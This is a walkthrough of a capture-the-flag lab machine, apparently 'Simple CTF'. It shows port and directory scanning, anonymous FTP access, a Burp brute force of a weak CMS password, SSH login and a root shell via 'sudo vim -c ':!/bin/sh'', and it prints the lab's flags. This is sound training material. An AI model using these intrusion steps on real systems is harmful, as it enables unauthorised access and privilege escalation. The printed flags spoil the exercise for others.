Simple CTF Walkthrough
NMAP SCAN
        Nmap scan to get the services and ports that are open
            nmap -A (IP)
                Nmap scan report for 10.10.98.239
        Host is up (0.19s latency).
        Not shown: 997 filtered ports
        PORT     STATE SERVICE VERSION
                21/tcp   open  ftp     vsftpd 3.0.3
        |           ftp-anon: Anonymous FTP login allowed (FTP code 230)
        |_Can't get directory listing: TIMEOUT
        | ftp-syst: 
        |   STAT: 
        | FTP server status:
        |      Connected to ::ffff:10.9.3.102
        |      Logged in as ftp
        |      TYPE: ASCII
        |      No session bandwidth limit
        |      Session timeout in seconds is 300
        |      Control connection is plain text
        |      Data connections will be plain text
        |      At session startup, client count was 1
        |      vsFTPd 3.0.3 - secure, fast, stable
        |_End of status
        80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
        | http-robots.txt: 2 disallowed entries 
        |_/ /openemr-5_0_1_3 
        |_http-server-header: Apache/2.4.18 (Ubuntu)
        |_http-title: Apache2 Ubuntu Default Page: It works
        2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
        |   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
        |_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

GOBUSTER
        ┌──(kali㉿kali)-[~]
        └─$ gobuster dir -u http://10.10.91.58/ -w /usr/share/dirb/wordlists/common.txt
        ===============================================================
        Gobuster v3.1.0
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        [+] Url:                     http://10.10.91.58/
        [+] Method:                  GET
        [+] Threads:                 10
        [+] Wordlist:                /usr/share/dirb/wordlists/common.txt
        [+] Negative Status codes:   404
        [+] User Agent:              gobuster/3.1.0
        [+] Timeout:                 10s
        ===============================================================
        2021/11/25 04:28:47 Starting gobuster in directory enumeration mode
        ===============================================================
        /.htpasswd            (Status: 403) [Size: 295]
        /.hta                 (Status: 403) [Size: 290]
        /.htaccess            (Status: 403) [Size: 295]
        /index.html           (Status: 200) [Size: 11321]
        /robots.txt           (Status: 200) [Size: 929]  
        /server-status        (Status: 403) [Size: 299]  
        /simple               (Status: 301) [Size: 311] [--> http://10.10.91.58/simple/]
                                                                                        
        ===============================================================
        2021/11/25 04:30:16 Finished
        ====================================             
/SIMPLE DIRECTORY
        Directory on the server,   
          Its hard to exploit when there are no user input spaces:
          But an advantage is that on the website content there is a link to login as an administrator; definitely a good rabbit hole
          The website main page it displays what version of CMS system is running on the server. 
          {© Copyright 2004 - 2021 - CMS Made Simple
        This site is powered by CMS Made Simple version 2.2.8}
        Time to do some exploit search
          For this searchsploit works best  
               searchsploit CMS 2.2.8                         
                        CMS Made Simple < 2.2.10 - SQL Injection        | php/webapps/46635.py
                                                                    
          


FTP 
this service allows anonymous login: try to access
Login Credentials: username= anonymous
                    password= NO PASSWORD
    Connected to 10.10.98.239.
        220 (vsFTPd 3.0.3)
        Name (10.10.98.239:kali): anonymous
        230 Login successful.
        Remote system type is UNIX.
lIST OF DIRECTORIES FOUND
        open directory and dowload the text file
        drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
        226 Directory send OK.

        ftp> cd pub
        250 Directory successfully changed.
        ftp> ls
        200 PORT command successful. Consider using PASV.
        150 Here comes the directory listing.
        -rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
        226 Directory send OK.
        ftp> cat ForMitch.txt
        ?Invalid command
        ftp> mget *
        mget ForMitch.txt? 
        200 PORT command successful. Consider using PASV.
        150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
        226 Transfer complete.
        166 bytes received in 0.00 secs (148.3160 kB/s)
        ftp> 
OPEN THE DOWNLOADED FTP FILE
    seems there is a user by the name Mitch,who is one silly person for not using some srong passwords on the system

    Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess
This automatically shows that one can brute-force to get the password


HTTP
Port number 80 Apache home page

BRUTE-FORCE
On a text file gathered from the ftp notice that there is a week password in play
lets brute force using burpsuite.
capture request send to intrude set the necessary then upload the wordlist best110
got a hit on the name secret
credentials for the cms admin login page
        mitch = secret
With the credentials one can try to ssh into the system

SSH

        ┌──(kali㉿kali)-[~]
        └─$ ssh mitch@10.10.91.58 -p 2222                                       148 ⨯ 2 ⚙
        The authenticity of host '[10.10.91.58]:2222 ([10.10.91.58]:2222)' can't be established.
        ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
        Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
        Warning: Permanently added '[10.10.91.58]:2222' (ECDSA) to the list of known hosts.
        mitch@10.10.91.58's password: 
        Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

        * Documentation:  https://help.ubuntu.com
        * Management:     https://landscape.canonical.com
        * Support:        https://ubuntu.com/advantage

        0 packages can be updated.
        0 updates are security updates.

        Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
        $ Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
        $ ls
        user.txt
        $ cat user.txt
        G00d j0b, keep up!
        $ 
A second user discovered
        $ pwd
        /home/mitch
        $ cd ..
        $ pwd
        /home
        $ ls
        mitch  sunbath
        $ 

PRIVILEGE ESCALATION


            $ sudo su
            [sudo] password for mitch: 
            Sorry, user mitch is not allowed to execute '/bin/su' as root on Machine.
            $ sudo -l
            User mitch may run the following commands on Machine:
                (root) NOPASSWD: /usr/bin/vim
$ 

mitch can run vim as root without a password
/home/mitch
$ sudo /usr/bin/vim -c ':!/bin/sh'

# ^[[2;2R
/bin/sh: 1: not found
/bin/sh: 1: 2R: not found
# whoami
root
# ls
user.txt
# cat user.txt
G00d j0b, keep up!
# 
# cat /root/root.txt
W3ll d0n3. You made it!
# 


